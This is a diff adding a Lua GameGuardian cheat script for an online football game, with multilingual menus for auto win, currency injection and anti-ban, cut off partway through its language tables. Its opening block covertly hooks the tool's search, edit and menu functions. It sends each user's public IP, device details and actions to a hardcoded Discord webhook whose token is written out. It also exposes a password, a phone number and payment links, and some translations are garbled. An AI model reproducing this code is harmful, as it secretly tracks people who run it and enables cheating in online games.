@@ -1,0 +1,2297 @@
+-- [[ 🟢 HANZ DARSIDE - AUTO DEEP MONITORING (HOOK EDITION) 🟢 ]] --
+local hanz = gg
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1481830154731913226/BtKIvQgDhTHetaDRyPfIVbbMTmkmbDtCP0J-fOgKPFpyCNiIVomoPSFqWMfCPvn3OTmG"
+
+-- 🛠️ FUNGSI INTERNAL DATA DEVICE
+local function GetHanzDevice()
+    local ip, device = "0.0.0.0", "ANDROID_DEVICE"
+    pcall(function()
+        local req = hanz.makeRequest("https://api.ipify.org")
+        if req and req.content then ip = req.content end
+    end)
+    local info = hanz.getTargetInfo()
+    if info then
+        local arch = info.x64 and "64-bit" or "32-bit"
+        local brand = os.getenv("RO.PRODUCT.BRAND") or os.getenv("BRAND") or "ANDROID"
+        device = brand:upper() .. " (" .. arch .. ")"
+    end
+    return ip, device
+end
+
+-- 🛠️ FUNGSI PENGIRIM LOG OTOMATIS
+local function AutoLog(aktivitas, warna)
+    local info = hanz.getTargetInfo()
+    local user_ip, device_full = GetHanzDevice()
+    local my_id = "HZ-" .. info.uid .. tostring(info.nativeLibraryDir):sub(-5):upper()
+    local json = string.format([[{"embeds":[{"title":"🛰️ HANZ LIVE MONITORING","color":%d,"fields":[{"name":"👤 ID","value":"%s","inline":true},{"name":"📱 DEVICE","value":"%s","inline":true},{"name":"⚙️ AKTIVITAS SCRIPT","value":"> **%s**","inline":false}]}]}]], 
+    warna or 5814783, my_id, device_full, aktivitas)
+    pcall(function() hanz.makeRequest(WEBHOOK_URL, {["Content-Type"]="application/json"}, json) end)
+end
+
+-- 🛡️ HOOKING SYSTEM (MEMATA-MATAI FUNGSI GG SECARA OTOMATIS)
+local oldSearch = hanz.searchNumber
+hanz.searchNumber = function(n, t, ...)
+    AutoLog("Sedang Mencari Nilai: " .. n .. " 🔍", 16776960)
+    return oldSearch(n, t, ...)
+end
+
+local oldEdit = hanz.editAll
+hanz.editAll = function(v, t)
+    AutoLog("Sedang Mengubah Nilai Menjadi: " .. v .. " ⚙️", 5814783)
+    local res = oldEdit(v, t)
+    AutoLog("BERHASIL! Nilai Telah Diubah ✅", 65280)
+    return res
+end
+
+local oldChoice = hanz.choice
+hanz.choice = function(opt, sel, msg)
+    local c = oldChoice(opt, sel, msg)
+    if c == nil then 
+        AutoLog("User Membatalkan Menu (Back) ⚠️", 16711680)
+    else 
+        AutoLog("User Memilih Menu: " .. tostring(opt[c]), 5814783)
+    end
+    return c
+end
+
+-- 🚀 LOG AWAL
+AutoLog("USER SEDANG MEMAKAI SCRIPT (LIVE) 🔥", 65280)
+
+-- [[ 🟢 JANGAN UBAH APAPUN DI BAWAH INI, TEMPEL KODE CHEAT KAMU DISINI 🟢 ]] --
+
+
+-- ============================================================
+-- 🎀 CYBERPUNK 2077: NEURAL OVERRIDE 🎀
+-- 🛠️ VERSION: V10.0 "PINK & GIRLY" EDITION
+-- 👤 OPERATOR: HANZ DARKSIDE
+-- 🌌 STYLE: PINK SYNDICATE / AESTHETIC VIBES
+-- ⏳ EXPIRE: CONFIGURABLE PROTOCOL
+-- ============================================================
+
+-- [[ 🔐 LOCK CONFIGURATION ]] ---------------------------------
+local PREMIUM_LOCKED = false         -- [ GANTI KE false UNTUK MEMBUKA SEMUA FITUR ]
+local PERPETUAL_MODE = true        -- [ true = TANPA BATAS / false = PAKAI TANGGAL ]
+local expire_date    = "2026-05-30" -- Cadangan jika PERPETUAL = false
+
+-- [[ 💰 DONATION CONFIGURATION - ISI DI SINI ]] --------------
+local DANA_NUMBER   = "085162984757" -- Ganti dengan nomor DANA Anda
+local PAYPAL_URL    = "https://paypal.me/DEDEHDEDEH434" -- Ganti dengan link PayPal Anda
+local BANK_DETAILS  = "BANK NAME: DEDEH-BANK-RAKYAT-INDONESIA-(BRI) | ACC: xxxx" -- Ganti dengan info Bank Anda
+
+-- [[ 🌐 NETWORKING ASSETS ]] ----------------------------------
+local SOSMED_LINK = "https://t.me/HAN_DARKSIDE"
+local WA_LINK     = "https://wa.me/6285162984757?text=Halo%20Hanz%20Darkside,%20saya%20ingin%20beli%20Akses%20Premium%20Script%20Cyberpunk"
+
+-- [[ 🌀 CORE ENGINE VARIABLES ]] ------------------------------
+local random_id        = math.random(10000, 1000000)
+local REAL_PASSWORD    = "SKYSEE"
+local ping_jump_active = false
+local auto_win_active  = false
+local pj_side          = "NONE"
+local pj_timer         = 0
+local pj_interval      = 6
+local is_running       = true
+local saved_ef_id      = nil
+
+-- [[ 🔊 INTERNAL CALM SOUND ENGINE - OPTIMIZED ]] -----------------
+function PlayPinkSound(sound_type)
+    -- Memastikan fungsi beep tersedia di Game Guardian
+    if not gg.beep then return end
+    pcall(function()
+        if sound_type == "connect" then
+            gg.beep(600, 200) gg.sleep(100) gg.beep(800, 250)
+        elseif sound_type == "click" then
+            gg.beep(750, 120)
+        elseif sound_type == "activate" then
+            gg.beep(900, 150) gg.sleep(50) gg.beep(1100, 150)
+        elseif sound_type == "error" then
+            gg.beep(400, 400)
+        elseif sound_type == "logout" then
+            gg.beep(800, 150) gg.sleep(100) gg.beep(600, 200)
+        end
+    end)
+end
+
+-- [[ ✉️ NEURAL BROADCAST DATABASE ]] --------------------------
+local hanz_quotes = {
+{
+en="LOVE YOU LIKE A SONG - Music to my heart, that's what you are. A song that goes on and on. 🎵💖",
+id="LOVE YOU LIKE A SONG - Musik di hatiku, begitulah dirimu. Lagu yang terus berputar selamanya. 🎼💓",
+cn="LOVE YOU LIKE a SONG - 你是我心中的旋律，你就是那首永远奏响的歌。✨💞",
+my="LOVE YOU LIKE A SONG - Muzik di hatiku, itulah dirimu. Lagu yang sentiasa berlagu. 🎶💝",
+jp="LOVE YOU LIKE A SONG - あなたは私の心の音楽、終わることのない歌そのもの。🎹💗",
+th="LOVE YOU LIKE A SONG - เธอคือดนตรีในหัวใจของฉัน คือบทเพลงที่ดังก้องไม่รู้จบ 💖✨",
+vn="LOVE YOU LIKE A SONG - Bạn là âm nhạc dalam trái tim tôi, một bài hát vang mãi tidak thôi. 💘🎵",
+ph="LOVE YOU LIKE A SONG - Ikaw ang musika sa aking puso, isang awit na walang katupusan. 💞🎼",
+ar="LOVE YOU LIKE A SONG - أنتِ الموسيقى لقلبي، أغنية لا تنتهي أبداً. 🎵💖",
+artist="◈ [SELENA GOMEZ]"
+},
+{
+en="LOVE ME NOT - Don't say you love me if you don't mean it, just stay in the moment. 🥀✨",
+id="LOVE ME NOT - Jangan katakan kau mencintaiku jika tak sungguh, cukup nikmati momen ini. 🥀✨",
+cn="LOVE ME NOT - 如果你不是真心的，就别说爱我，只停留在这一刻吧。🥀✨",
+my="LOVE ME NOT - Jangan katakan kau cintaku jika tidak jujur, cukup tinggal dalam momen ini. 🥀✨",
+jp="LOVE ME NOT - 本気じゃないなら愛しているなんて言わないで, hanya tinggal dalam momen ini. 🥀✨",
+th="LOVE ME NOT - อย่าบอกว่ารักถ้า tidak berarti seperti itu. Tinggallah di momen ini saja 🥀✨",
+vn="LOVE ME NOT - Đừng nói yêu tôi nếu bạn tidak thật lòng, hãy cứ ở lại dalam khoảnh khắc ini. 🥀✨",
+ph="LOVE ME NOT - Huwag mong sabihing mahal mo ako kung hindi totoo, manatili lang sa sandaling ito. 🥀✨",
+ar="LOVE ME NOT - لا تقل أنك تحبني إذا لم تكن تقصد ذلك، فقط عش اللحظة. 🥀✨",
+artist="◈ [ORANGE COUNTY]"
+},
+{
+en="BACK TO YOU - I could fight or I could wait, but I'd rather take the risk with you. 💖💫",
+id="BACK TO YOU - Aku bisa melawan atau menunggu, tapi aku lebih memilih mengambil risiko bersamamu. 💖💫",
+cn="BACK TO YOU - 我可以抗争，也可以等待，但我宁愿和你一起冒险。💖💫",
+my="BACK TO YOU - Aku boleh melawan atau menunggu, tapi aku lebih rela mengambil risiko bersamamu. 💖💫",
+jp="BACK TO YOU - 抗うことも待つこともできるけど、あなたと一緒にリスクを冒したい. 💖💫",
+th="BACK TO YOU - ฉันจะสู้ atau akan menunggu, tapi aku lebih memilih mengambil risiko bersamamu. 💖💫",
+vn="BACK TO YOU - Tôi có thể đấu tranh atau menunggu, mnhưng saya thà mạo hiểm bersama anda. 💖💫",
+ph="BACK TO YOU - Maaari akong lumaban o maghintay, ngunit mas pipiliin kong makipagsaparalan ka. 💖💫",
+ar="BACK TO YOU - يمكنني القتال أو الانتظار، لكني أفضل المخاطرة معك. 💖💫",
+artist="◈ [SELENA GOMEZ]"
+},
+}
+
+-- [[ 📩 DATABASE PESAN PENUTUP ]] -------------
+local hanz_final_pool = {
+{
+id="Terima kasih sudah menggunakan HNZ Project! Sampai jumpa di versi berikutnya. Stay Safe & Keep Hacking! 🌸✨",
+en="Thank you for using HNZ Project! See you in the next version. Stay Safe & Keep Hacking! 🌸✨",
+cn="感谢使用 HNZ 项目！下个版本再见。注意安全，继续黑客攻击！🌸✨",
+my="Terima kasih kerana menggunakan Projek HNZ! Jumpa lagi di versi seterusnya. Stay Safe & Keep Hacking! 🌸✨",
+jp="HNZプロジェクトをご利用いただきありがとうございます！次のバージョンでお会いしましょう。🌸✨",
+th="ขอบคุณที่ใช้ HNZ Project! พบกันใหม่ในเวอร์ชันหน้า ขอให้สนุกกับการแฮ็ก! 🌸✨",
+vn="Cảm ơn bạn đã menggunakan HNZ Project! Hẹn gặp lại ở phiên bản tiếp theo. 🌸✨",
+ph="Salamat sa paggamit ng HNZ Project! Hanggang sa muling bersyon. Stay Safe! 🌸✨",
+ar="شكراً لاستخدامك مشروع HANZ! نراك في الإصدار القادم. ابقَ آمناً واستمر في القرصنة! 🌸✨"
+},
+{
+id="Koneksi diputus oleh sistem. Tetaplah menjadi yang terbaik di Night City, Samurai! 💖🌃",
+en="Connection severed by system. Stay the best in Night City, Samurai! 💖🌃",
+cn="系统断开连接。在夜城保持最强，武士！💖🌃",
+my="Sambungan diputus oleh sistem. Teruslah menjadi yang terbaik di Night City, Samurai! 💖🌃",
+jp="システムにより接続が切断されました。ナイトシティで最高の侍でいてください！💖🌃",
+th="ระบบตัดการเชื่อมต่อแล้ว จงเป็นที่สุด in Night City ต่อไปนะ ซามูไร! 💖🌃",
+vn="Kết kết nối đã bị ngắt bởi hệ thống. Hãy selalu menjadi yang terbaik di Night City, Samurai! 💖🌃",
+ph="Naputol ang koneksyon ng system. Manatiling pinakamahusay sa Night City, Samurai! 💖🌃",
+ar="انقطع الاتصال بالنظام. ابقَ الأفضل في مدينة الليل، أيها الساموراي! 💖🌃"
+},
+{
+id="Pink Syndicate Logout... Jangan lupa istirahat, hacking butuh energi ekstra! 🍭💊",
+en="Pink Syndicate Logout... Don't forget to rest, hacking needs extra energy! 🍭💊",
+cn="粉红集团注销...别忘了休息，黑客攻击需要额外的能量！🍭💊",
+my="Pink Syndicate Logout... Jangan lupa berehat, hacking perlukan tenaga ekstra! 🍭💊",
+jp="ピンク・シンジケート・ログアウト...休憩を忘れないで, hacking kailangan ng energiya! 🍭💊",
+th="Pink Syndicate ออกจากระบบ... อย่าลืมพักผ่อนบ้างนะ การแฮ็กต้องใช้พลังงานเยอะ! 🍭💊",
+vn="Pink Syndicate Đăng xuất... Đừng quên nghỉ ngơi, hack cần thêm năng lượng! 🍭💊",
+ph="Pink Syndicate Logout... Huwag kalimutang magpahinga, kailangan ng hacking ng extra energy! 🍭💊",
+ar="تسجيل خروج Pink Syndicate... لا تنسَ الراحة، القرصنة تحتاج طاقة إضافية! 🍭💊"
+}
+}
+
+-- [[ 🎀 PINK-AESTHETIC UI ASSETS ]] --------------------------
+local ASCII_HNZ = [[
+█   █   █     █  ███████
+█   █   ██   █                █
+█████  █  █        █ █
+█   █   █  █  █   █
+█   █   █   ██  ███████
+]]
+
+local LINE      = "🌸💖🌸💖🌸💖🌸💖🌸💖🌸💖🌸💖🌸💖🌸💖🌸💖🌸💖🌸💖🌸"
+local DIVIDER   = "───ʚ🎀ɞ───ʚ🎀ɞ───ʚ🎀ɞ───ʚ🎀ɞ───ʚ🎀ɞ───"
+local BORDER    = "╭━━━ ♡ 🎀 ꒰ ＨＡＮＺ  ＰＲＯＪＥＣＴ ꒱ 🎀 ♡ ━━━╮"
+local BORDER_B  = "╰━━━━━ ♡ 🎀 ━━━━━━━━━━━━━━━━━━━━ 🎀 ♡ ━━━━━╯"
+
+-- [[ 🌐 DEEP MULTI-LANGUAGE SYSTEM ]] -------------------------
+local L = {}
+local selected_lang_id = 1
+
+function SetLanguage(lang)
+selected_lang_id = lang
+if lang == 1 then -- INDONESIA
+L = {
+welcome = "Selamat Datang di Jaringan Hanz",
+ready = "Sistem siap. Tekan OK untuk menyambungkan tautan neural.",
+status = "STATUS: TERLINDUNGI",
+pass_prompt = "MASUKKAN KATA SANDI:",
+access_ok = "AKSES DITERIMA",
+access_fail = "AKSES DITOLAK / PELANGGARAN KEAMANAN",
+contact = "Hubungi Netrunner untuk mendapatkan kunci.",
+init = "MEMULAI INTI...",
+back = "KEMBALI",
+loading = "MENGUNGGAH DATA",
+scanning = "PEMINDAIAN NEURAL",
+granted = "AKSES DIIZINKAN",
+sync = "SINKRONISASI SELESAI!",
+locked_title = "AKSES DITOLAK",
+locked_msg = "Maaf, fitur ini hanya untuk Member Premium.",
+p_order = "BELI VIA WHATSAPP",
+p_tele = "BELI VIA TELEGRAM",
+warp_init = "MEMPERSIAPKAN LOMPATAN WARP",
+warp_eng = "MESIN WARP AKTIF!",
+sec_securing = "MENGAMANKAN SISTEM",
+sec_active = "STEALTH NEURAL AKTIF",
+mem_wipe = "LOG MEMORI DIBERSIHKAN",
+goal_ok = "SKOR NEURAL DISUNTIKKAN: 3",
+goal_fail = "NODE TIDAK DITEMUKAN",
+cancel_match = "INISIASI PEMBATALAN GAME",
+force_kill = "TUTUP PAKSA GAME?",
+shutdown = "PROTOKOL MATIKAN",
+idle_msg = "MENUNGGU DISKONEKSI BERSIH",
+warp_speed = "KECEPATAN WARP AKTIF",
+lang_label = "INDONESIA",
+op_label = "OPERATOR: ELITE MERC",
+page1 = "PILIH ANTARMUKA - HALAMAN 1",
+page2 = "DIAGNOSTIK NEURAL - HALAMAN 2",
+page3 = "MENU HACK LAINNYA - HALAMAN 3",
+hack_other = "HACK MENU LAINNYA",
+ping_jump = "LOMPATAN PING",
+auto_win = "MENANG OTOMATIS",
+currency = "GP & E-KOIN",
+cancel_m = "BATAL PERTANDINGAN",
+f_kill = "TUTUP PAKSA",
+jack_out = "KELUAR",
+ice_breaker = "PENGHANCUR ES (ANTI-BAN)",
+network = "JARINGAN (SOSMED)",
+scanner = "PEMINDAI DALAM",
+tuner = "PENYETEL CYBERWARE",
+home_side = "SISI TUAN RUMAH",
+away_side = "SISI TAMU",
+config_title = "KONFIGURASI LOMPATAN PING",
+inject_gp = "SUNTIK KOIN GP (MAX 999.999.999)",
+inject_coin = "SUNTIK E-COIN (MAX 999.999)",
+currency_title = "OVERRIDE MATA WANG NEURAL",
+amt_prompt = "MASUKKAN JUMLAH:",
+gp_ok = "DATA GP TELAH DIUBAH",
+coin_ok = "DATA E-COIN TELAH DIUBAH",
+failed = "GAGAL",
+hw_opt = "OPTIMASI PERANGKAT KERAS",
+overclock = "OVERCLOCK",
+fps_120 = "120 FPS",
+ram_clean = "BERSIHKAN RAM",
+new_scan = "PEMINDAIAN BARU",
+wipe_scan = "HAPUS",
+fast_link = "PROTOKOL TAUTAN CEPAT",
+term_exit = "BERHENTI / KELUAR",
+login_back = "LUPA KATA SANDI",
+score_target = "Target Skor: 3. Pastikan game tidak dalam kondisi PAUSE.",
+continue = "LANJUTKAN",
+cancel = "BATAL",
+accel_win = "MEMPERCEPAT KEMENANGAN...",
+system_stab = "SISTEM STABIL",
+proto_abort = "PROTOKOL DIBALANKAN",
+proto_fin = "PROTOKOL SELESAI",
+end_match = "AKHIRI (SKIP WAKTU)",
+selector_title = "PEMILIH PEMBATALAN GAME",
+delay_inst = "TANPA JEDA (INSTAN)",
+delay_10 = "JEDA 10 DETIK",
+delay_30 = "JEDA 30 DETIK",
+delay_60 = "JEDA 60 DETIK",
+remaining = "TERSISA",
+severed = "LINK TERPUTUS",
+term_ok = "IYA",
+term_no = "TIDAK",
+disc_in = "TERPUTUS DALAM",
+logo_premium = "🎀 H A N Z  P R O J E C T 🎀\n🧁 [V10.0 PINK EDITION] 🧁",
+msg_title = "PESAN Dari HANZ",
+connect_btn = "◈ 🌸✨ HUBUNGKAN SEKARANG ✨🌸 ◈",
+start_now = "◈ 🌸✨ MULAI SEKARANG ✨🌸 ◈",
+disconnect_btn = "◈ 🎀 PUTUSKAN 🎀 ◈",
+sys_ok = "OK",
+sys_cancel = "BATAL",
+forgot_pass = "LUPA KATA SANDI",
+calc_name = "CALCULATOR",
+calc_val1 = "ANGKA PERTAMA (ATAS)",
+calc_val2 = "ANGKA KEDUA (BAWAH)",
+calc_res = "HASIL PERHITUNGAN",
+calc_desc = "Pilih operasi matematika yang diinginkan.",
+calc_mode = "PILIH MODE OPERASI",
+donate_title = "Dukung Developer (Donasi)",
+donate_msg = "Terima kasih atas dukungannya! Silakan pilih metode pembayaran.",
+donate_copied = "Informasi telah disalin ke clipboard!",
+exit_choice = "DONASI & KELUAR",
+h_antiban = "ANTI BAN UPDATE FIX ✔",
+h_autowin = "AUTO WIN SEMUA PERANGKAT ☐",
+h_online = "MENU ONLINE",
+h_offline = "MENU OFFLINE",
+h_void = "BATALKAN PERTANDINGAN (VOID)",
+h_epic = "LOBI PEMAIN EPIK",
+h_cond = "KONDISI FULL (BIRU)",
+h_90fps = "AKTIFKAN 90 FPS",
+h_dribble = "HACK DRIBBLE",
+h_aim = "AUTO AIM GOL",
+h_penhack = "HACK PENALTI",
+h_nopen = "TANPA PENALTI",
+h_short = "PEMAIN PENDEK",
+h_tall = "PEMAIN TINGGI",
+h_weakgk = "KIPER LEMAH"
+}
+elseif lang == 2 then -- ENGLISH
+L = {
+welcome = "Welcome to Hanz Network",
+ready = "System ready. Press OK to establish neural link.",
+status = "STATUS: SECURED",
+pass_prompt = "ENTER PASSWORD:",
+access_ok = "ACCESS GRANTED",
+access_fail = "ACCESS DENIED / SECURITY BREACH",
+contact = "Contact Netrunner for data chips.",
+init = "INITIALIZING CORE...",
+back = "BACK",
+loading = "LOADING DATA",
+scanning = "ID SCANNER",
+granted = "ACCESS GRANTED",
+sync = "SYNC COMPLETE!",
+locked_title = "ACCESS DENIED",
+locked_msg = "Sorry, this feature is only for Premium Members.",
+p_order = "ORDER VIA WHATSAPP",
+p_tele = "BUY VIA TELEGRAM",
+warp_init = "PREPARING WARP DRIVE",
+warp_eng = "WARP DRIVE ENGAGED!",
+sec_securing = "SECURING SYSTEM",
+sec_active = "NEURAL STEALTH ACTIVE",
+mem_wipe = "MEMORY LOGS PURGED",
+goal_ok = "NEURAL SCORE INJECTED: 3",
+goal_fail = "NODE NOT FOUND",
+cancel_match = "INITIATING CANCEL GAME",
+force_kill = "FORCE KILL SYSTEM?",
+shutdown = "SHUTDOWN PROTOCOL",
+idle_msg = "WAITING FOR CLEAN DISCONNECT",
+warp_speed = "WARP SPEED ACTIVE",
+lang_label = "ENGLISH",
+op_label = "OPERATOR: ELITE MERC",
+page1 = "SELECT INTERFACE - PAGE 1",
+page2 = "NEURAL DIAGNOSTICS - PAGE 2",
+page3 = "OTHER HACKS MENU - PAGE 3",
+hack_other = "OTHER HACKS MENU",
+ping_jump = "PING JUMP",
+auto_win = "AUTO WIN",
+currency = "GP & E-COIN",
+cancel_m = "CANCEL MATCH",
+f_kill = "FORCE KILL",
+jack_out = "JACK OUT",
+ice_breaker = "ICE BREAKER (ANTI-BAN)",
+network = "NETWORK (SOSMED)",
+scanner = "DEEP SCANNER",
+tuner = "CYBERWARE TUNER",
+home_side = "HOME SIDE",
+away_side = "AWAY SIDE",
+config_title = "PING JUMP CONFIG",
+inject_gp = "INJECT GP COINS (MAX 999.999.999)",
+inject_coin = "INJECT E-COINS (MAX 999.999)",
+currency_title = "NEURAL CURRENCY OVERRIDE",
+amt_prompt = "ENTER AMOUNT:",
+gp_ok = "GP DATA OVERRIDDEN",
+coin_ok = "E-COIN DATA OVERRIDDEN",
+failed = "FAILED",
+hw_opt = "HARDWARE OPTIMIZATION",
+overclock = "OVERCLOCK",
+fps_120 = "120 FPS",
+ram_clean = "RAM CLEAN",
+new_scan = "NEW SCAN",
+wipe_scan = "WIPE",
+fast_link = "FAST LINK PROTOCOL",
+term_exit = "TERMINATE / EXIT",
+login_back = "FORGOT PASSWORD",
+score_target = "Target Score: 3. Ensure the game is NOT PAUSED.",
+continue = "CONTINUE",
+cancel = "CANCEL",
+accel_win = "ACCELERATING TO VICTORY...",
+system_stab = "SYSTEM STABILIZED",
+proto_abort = "PROTOCOL ABORTED",
+proto_fin = "PROTOCOL FINISHED",
+end_match = "END MATCH (TIME SKIP)",
+selector_title = "CANCEL MATCH SELECTOR",
+delay_inst = "NO DELAY (INSTANT)",
+delay_10 = "DELAY 10 SECS",
+delay_30 = "DELAY 30 SECS",
+delay_60 = "DELAY 60 SECS",
+remaining = "REMAINING",
+severed = "REMAINING",
+term_ok = "YES",
+term_no = "NO",
+disc_in = "DISCONNECTING IN",
+logo_premium = "🎀 H A N Z  P R O J E C T 🎀\n🧁 [V10.0 PINK EDITION] 🧁",
+msg_title = "MESSAGE FROM HANZ",
+connect_btn = "◈ 🌸✨ CONNECT NOW ✨🌸 ◈",
+start_now = "◈ 🌸✨ START NOW ✨🌸 ◈",
+disconnect_btn = "◈ 🎀 DISCONNECT 🎀 ◈",
+sys_ok = "OK",
+sys_cancel = "CANCEL",
+forgot_pass = "FORGOT PASSWORD",
+calc_name = "CALCULATOR",
+calc_val1 = "FIRST NUMBER (TOP)",
+calc_val2 = "SECOND NUMBER (BOTTOM)",
+calc_res = "CALCULATION RESULT",
+calc_desc = "Choose the desired mathematical operation.",
+calc_mode = "SELECT OPERATION MODE",
+donate_title = "Support Developer (Donate)",
+donate_msg = "Thank you for your support! Please select a payment method.",
+donate_copied = "Information copied to clipboard!",
+exit_choice = "DONATE & EXIT",
+h_antiban = "ANTI BAN UPDATE FIX ✔",
+h_autowin = "AUTO WIN ALL DEVICES ☐",
+h_online = "ONLINE MENU",
+h_offline = "OFFLINE MENU",
+h_void = "VOID MATCH",
+h_epic = "EPIC PLAYER LOBBY",
+h_cond = "CONDITION FULL",
+h_90fps = "ENABLE 90 FPS",
+h_dribble = "DRIBBLING HACK",
+h_aim = "AUTO AIM GOAL",
+h_penhack = "PENALTY HACK",
+h_nopen = "NO PENALTY",
+h_short = "SHORT LENGTH",
+h_tall = "TALL HEIGHT",
+h_weakgk = "WEAK GOALKEEPER"
+}
+elseif lang == 3 then -- CHINA
+L = {
+welcome = "欢迎连接 HANZ 神经网络",
+ready = "核心系统就绪。点击确定以同步神经链路。",
+status = "防火墙状态：已加固",
+pass_prompt = "请输入访问密钥 (PASSWORD):",
+access_ok = "身份验证成功 - 准许接入",
+access_fail = "访问 be 拒绝 / 检测到安全违规",
+contact = "请联系网络跑者 (Netrunner) 获取授权码。",
+init = "核心初始化中...",
+back = "返回",
+loading = "数据加载中",
+scanning = "神经特征扫描中",
+granted = "权限已授予",
+sync = "同步协议完成！",
+locked_title = "访问受限",
+locked_msg = "抱歉，此模块仅供高级会员 (Premium) 使用。",
+p_order = "通过 WHATSAPP 订购",
+p_tele = "通过 TELEGRAM 购买",
+warp_init = "正在筹备空间跳跃驱动",
+warp_eng = "曲速引擎已启动！",
+sec_securing = "正在加固核心防御系统",
+sec_active = "神经隐匿模式已激活",
+mem_wipe = "内存追踪痕迹已清除",
+goal_ok = "神经得分注入成功: 3",
+goal_fail = "未侦测到目标节点",
+cancel_match = "正在启动比赛强行终止协议",
+force_kill = "强制断开系统连接？",
+shutdown = "关机指令协议",
+idle_msg = "等待安全断开连接",
+warp_speed = "空间跳跃速度已激活",
+lang_label = "CHINESE",
+op_label = "操作员：精英雇佣兵",
+page1 = "选择界面 - 第1页",
+page2 = "神经诊断 - 第2页",
+page3 = "其他黑客菜单 - 第3页",
+hack_other = "其他黑客菜单",
+ping_jump = "延迟跳跃 (Ping Jump)",
+auto_win = "自动获胜",
+currency = "GP 和 E-币注入",
+cancel_m = "终止比赛",
+f_kill = "强制结束",
+jack_out = "退出系统",
+ice_breaker = "破冰船 (防封禁)",
+network = "社交网络",
+scanner = "深度扫描仪",
+tuner = "赛博组件调谐",
+home_side = "主场侧",
+away_side = "客场侧",
+config_title = "跳跃参数配置",
+inject_gp = "注入 GP (最高 9.9亿)",
+inject_coin = "注入 E-币 (最高 99万)",
+currency_title = "货币数据覆写",
+amt_prompt = "输入数量:",
+gp_ok = "GP 数据已覆盖",
+coin_ok = "E-币数据已覆盖",
+failed = "失败",
+hw_opt = "硬件优化",
+overclock = "超频",
+fps_120 = "120 帧率",
+ram_clean = "清理内存",
+new_scan = "新扫描",
+wipe_scan = "擦除",
+fast_link = "快速连接协议",
+term_exit = "终止并退出",
+login_back = "忘记密码",
+score_target = "目标分数：3。请确保游戏未暂停。",
+continue = "继续",
+cancel = "取消",
+accel_win = "正在加速通往胜利...",
+system_stab = "系统已稳定",
+proto_abort = "协议已中止",
+proto_fin = "协议执行完毕",
+end_match = "结束比赛 (跳过时间)",
+selector_title = "比赛终止延迟选择",
+delay_inst = "无延迟 (立即)",
+delay_10 = "延迟 10 秒",
+delay_30 = "延迟 30 秒",
+delay_60 = "延迟 60 秒",
+remaining = "剩余时间",
+severed = "连接已切断",
+term_ok = "是",
+term_no = "否",
+disc_in = "断开连接倒计时",
+logo_premium = "🎀 H A N Z  P R O J E C T 🎀\n🧁 [V10.0 PINK EDITION] 🧁",
+msg_title = "来自 HANZ 的消息",
+connect_btn = "◈ 🌸✨ 立即连接 ✨🌸 ◈",
+start_now = "◈ 🌸✨ 立即开始 ✨🌸 ◈",
+disconnect_btn = "◈ 🎀 断开连接 🎀 ◈",
+sys_ok = "确定",
+sys_cancel = "取消",
+forgot_pass = "忘记密码",
+calc_name = "计算器",
+calc_val1 = "第一个数字 (上)",
+calc_val2 = "第二个数字 (下)",
+calc_res = "计算结果",
+calc_desc = "选择所需的数学运算。",
+calc_mode = "选择操作模式",
+donate_title = "支持开发者 (捐赠)",
+donate_msg = "感谢您的支持！请选择支付方式。",
+donate_copied = "信息已复制到剪贴板！",
+exit_choice = "捐赠并退出",
+h_antiban = "防封禁更新修复 ✔",
+h_autowin = "全设备自动获胜 ☐",
+h_online = "在线菜单",
+h_offline = "离线菜单",
+h_void = "废除比赛 (VOID)",
+h_epic = "史诗球员大厅",
+h_cond = "满状态 (蓝箭头)",
+h_90fps = "开启 90 FPS",
+h_dribble = "运球增强",
+h_aim = "自动瞄准进球",
+h_penhack = "点球修改",
+h_nopen = "无点球模式",
+h_short = "矮个球员",
+h_tall = "高个球员",
+h_weakgk = "弱化守门员"
+}
+elseif lang == 4 then -- MALAY
+L = {
+welcome = "Selamat Datang ke Rangkaian Hanz",
+ready = "Sistem sedia. Tekan OK untuk sambungan neural.",
+status = "STATUS: DILINDUNGI",
+pass_prompt = "MASUKKAN KATA LALUAN:",
+access_ok = "AKSES DIBERIKAN",
+access_fail = "AKSES DINAFIKAN / PENCEROBOHAN KESELAMATAN",
+contact = "Hubungi Netrunner untuk mendapatkan cip data.",
+init = "MEMULAKAN TERAS...",
+back = "KEMBALI",
+loading = "MEMUATKAN DATA",
+scanning = "PENGIMBAS ID",
+granted = "AKSES DIBENARKAN",
+sync = "SINKRONISASI SELESAI!",
+locked_title = "AKSES DINAFIKAN",
+locked_msg = "Maaf, ciri ini hanya untuk Ahli Premium.",
+p_order = "PESAN MELALUI WHATSAPP",
+p_tele = "BELI MELALUI TELEGRAM",
+warp_init = "MENYEDIAKAN PANDUAN WARP",
+warp_eng = "WARP DRIVE DIAKTIFKAN!",
+sec_securing = "MENGAMANKAN SISTEM",
+sec_active = "STEALTH NEURAL AKTIF",
+mem_wipe = "LOG MEMORI DIBERSIHKAN",
+goal_ok = "SKOR NEURAL DISUNTIK: 3",
+goal_fail = "NODE TIDAK DITEMUI",
+cancel_match = "MEMULAKAN PEMBATALAN PERLAWANAN",
+force_kill = "TUTUP PAKSA SISTEM?",
+shutdown = "PROTOKOL PENUTUPAN",
+idle_msg = "MENUNGGU DISKONEKSI BERSIH",
+warp_speed = "KELAJUAN WARP AKTIF",
+lang_label = "MALAY",
+op_label = "OPERATOR: ELITE MERC",
+page1 = "PILIH ANTARMUKA - HALAMAN 1",
+page2 = "DIAGNOSTIK NEURAL - HALAMAN 2",
+page3 = "MENU HACK LAIN - HALAMAN 3",
+hack_other = "MENU HACK LAIN",
+ping_jump = "LOMPATAN PING",
+auto_win = "MENANG OTOMATIS",
+currency = "GP & E-COIN",
+cancel_m = "BATAL PERLAWANAN",
+f_kill = "TUTUP PAKSA",
+jack_out = "KELUAR",
+ice_breaker = "PENGHANCUR AIS (ANTI-BAN)",
+network = "RANGKAIAN (SOSMED)",
+scanner = "PENGIMBAS DALAM",
+tuner = "PENYETEL CYBERWARE",
+home_side = "PIHAK TUAN RUMAH",
+away_side = "PIHAK LAWAN",
+config_title = "KONFIGURASI LOMPATAN PING",
+inject_gp = "SUNTIK GP (MAX 999.999.999)",
+inject_coin = "SUNTIK E-COIN (MAX 999.999)",
+currency_title = "OVERRIDE MATA WANG NEURAL",
+amt_prompt = "MASUKKAN JUMLAH:",
+gp_ok = "DATA GP DIUBAH",
+coin_ok = "DATA E-COIN DIUBAH",
+failed = "GAGAL",
+hw_opt = "HARDWARE OPTIMIZATION",
+overclock = "OVERCLOCK",
+fps_120 = "120 FPS",
+ram_clean = "LINIS RAM",
+new_scan = "BAGONG SCAN",
+wipe_scan = "BURAHIN",
